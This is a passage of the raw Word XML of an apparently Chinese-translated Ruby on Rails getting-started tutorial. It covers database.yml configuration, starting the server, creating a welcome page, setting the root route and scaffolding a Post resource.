          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">username: root </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BFA99A1" w14:textId="77777777" w:rsidR="00142ECF" w:rsidRDefault="00142ECF"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hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">password: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E4A031" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="00142ECF"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hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>socket: /tmp/mysql.sock</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E21E1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如果你的开发电脑的 MySQL 安装的时候包含了一个名叫 ‘root’ 的用户以及一个空密码，这个配置文件应该会为你工作。否则，在 development 部分模式更改为合适的用户名和密码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A92B3A"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6.3 配置一个 PostgreSQL 数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05EC25D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如果你选择使用 PostgreSQL，你的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会定制来使用 PostgreSQL 数据库：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F75684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development: adapter: postgresql encoding: unicode database: blog_development pool: 5 username: blog password:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662F23B8"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6.4 配置一个用于 JRuby 平台的 SQLite3 数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397A2A34"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如果你选择使用 SQLite3 并且使用 JRuby，你的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会看起来有点不同。这里是 development 部分：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB1D6FF"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development: adapter: jdbcmysql database: blog_development username: root password:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2791C0C4"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6.5 配置一个用于 JRuby 平台的 PostgreSQL 数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D9CE7A9"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最后如果你选择使用 PostgreSQL 并且正在使用 JRuby，你的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>将会看起来有点不同。这里是 development 部分：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27700AAC"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development: adapter: jdbcpostgresql encoding: unicode database: blog_development username: blog password:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10563EE1"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7 Hello, Rails!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B701C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传统的方式之一，开始使用一种新的（命令）语法并得到快速掠过的文字。要得到这样的结果你需要使你的 Rails 程序运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CBE013"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7.1 启动web服务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025FF5E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你实际上已经有了一个 Rails 功能的应用程序了。看一看它，你需要在你的生产机器上启动一个 web 服务，你可以这样来启动。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1896"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="7AF64A26" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3669267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rails server</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5587823F"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编译 CoffeeScript 到 JavaScript需要一个 JavaScript 运行库，确实一个运行库将会给出一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>execjs</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> error。通常 Mac OS X 和 Windows 自带了一个 JavaScript 运行库。Rails 添加了 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>therubyracer</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem 到 Gemfile 的注释行中如果你需要可以取消对它的注释。</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>therubyrhino</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 推荐 JRuby 使用并且默认添加到 Gemfile 中如果应用程序在 JRuby 中创建。你可以查看所有的支持的运行库 </w:t>
      </w:r>
      <w:hyperlink r:id="rId77" w:anchor="readme%E3%80%82" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ExecJS</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4A9CA13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这里默认将开启一个 WEBrick 服务器的的实例（Rails 也可能使用一些其他的 web 服务器）。查看你的应用程序的行为，打开一个浏览器并且导航到 127.0.0.0：3000 你将会看到一个 Rails 默认的信息页面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E0F418"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45F6D26A" wp14:editId="28F30CF1">
            <wp:extent cx="8258175" cy="6181725"/>
            <wp:effectExtent l="19050" t="0" r="9525" b="0"/>
            <wp:docPr id="2" name="图片 2" descr="Welcome Aboar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lcome Aboard screenshot"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId78" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="8258175" cy="6181725"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5201435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要终止 web 服务，在命令运行的终端中按下 Ctrl+C 。在开发环境模式中，Rails 一般不需要你停止服务；你所做的更改将自动的编译进需要的文件中并且重启服务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1582305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这个欢迎界面体现了一个新的 Rails 应用程序创建成功（通过了 Rails 的自检）。你可以点击‘ About your application’s environment’查看你的应用程序运行环境摘要信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8610A4"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7.2 Rails 说 Hello"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3839278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要使 Rails 说出（显示）“你好”，你还需要创建一个最小的 controller 和 view。幸运的是，你可以完成这些通过一行命令。在终端中输入：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5136"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="5EA1FCCF" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03AEA94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rails generate controller welcome index</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="076C8B7C"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提示: 如果你在输入这个命令的时候出现没有这个命令错误，你需要明确的使用 ruby 来执行 Rails 命令。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2FD84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Rails 将会为你创建一些文件，包含 `app/views/home/index.html.erb` 。这个模板会用来显示在 home controller 中的 index action (method) 的结果。在文本编辑器中打开这个文件并输入：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488A1462"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rPr>
        <w:t xml:space="preserve">&lt;h1&gt;Hello, Rails!&lt;/h1&gt; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743CCA97"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7.3 设置应用程序主页</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B34FEA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现在我们已经创建了 controller 和 view，我们还需要告诉 Rails 我们想在什么时候显示出来。在本例中，我们想让它在我们导航至站点 url 根目录 </w:t>
      </w:r>
      <w:hyperlink r:id="rId79" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://localhost:3000</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候替代 “Welcome Aboard” 显示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B198FC1"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首先移除应用程序中的默认页面。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2856"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="7F6086ED" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EAC9F1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rm public/index.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3525342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我们必须这样做因为，Rails将会传送任何在public的静态文件优先于我们在 controllers生成的动态（显示）内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F4F6269"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现在你还必须告诉 Rails 你实际上的主页在哪里。在文本编辑器中打开 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。这是你应用程序的路由文件，它采用 DSL 语言囊括了告诉 Rails 怎样连接请求信息到 controllers 和 actions的所有条目。这个文件包含许多简单的路由命令，其中一条实际上是用于告诉我们怎样连接你站点根目录到一个指定的controller and acti。找到以root :to开头的那一行，注释掉它改成如下内容：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="7E84559B" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="537F3B9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Blog::Application.routes.draw do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="531E345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48CA228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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D9B6EB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 You can have the root of your site routed with "root"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EF3E60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 just remember to delete public/index.html.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DCCA28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w:t>
            </w:r>
            <w:r w:rsidRPr="00142ECF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>root :to</w:t>
            </w:r>
            <w:r w:rsidRPr="00142ECF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00142ECF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; "welcome#index"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="35D51478"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rPr>
        <w:t>root :to =&gt; "welcome#index"</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>告诉 Rails 映射请求到应用程序的root action到 home 控制器的 index action。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7F0E7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现在你在浏览器中导航至 </w:t>
      </w:r>
      <w:hyperlink r:id="rId80" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://localhost:3000</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，你将会看到“Hello, Rails!”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075BDBE2"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更多的信息请参见 </w:t>
      </w:r>
      <w:hyperlink r:id="rId81" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails Routing from the Outside In</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0F13FD"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8 使用 Scaffolding 快速创建并运行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7EB52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是一个快速的方法产生应用程序的一些重要组成。如果你想使用一种简单的操作为新资源创建models,views和controllers，Scaffolding是一个不错的工具。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF8E773"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9 创建一个资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D3DC6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在本示例中的 blog 应用程序，你可以使用 scaffolded 产生 post 资源：它表现为一个简单的 blog posting。要完成这些，在终端输入如下命令：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8136"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="5EC5E5BD" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2FBC1D8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rails generate scaffold Post name:string</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>title:string</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>content:text</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="690B5CBF"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创建器将会在应用程序中的一些文件夹中生成一些文件，并且还会编辑 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。下面这些产生的文件的大概说明：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5136"/>
        <w:gridCol w:w="3386"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="33F6ED26" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="73F20A76" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>File/Folder</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27885378" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="71E3F867" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22F49A6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db/migrate/20100207214725_create_posts.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1CD3515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将创建的posts表单迁移到你的数据库（会在你的命名前面加上时间）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="71309F72" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51BD6F0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app/models/post.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B59DAE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Post模型</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="66A818FC" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7161C13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test/unit/post_test.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E3F1F7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Unit testing harness for the posts model</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="56B5240A" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="59D3712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test/fixtures/posts.yml </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
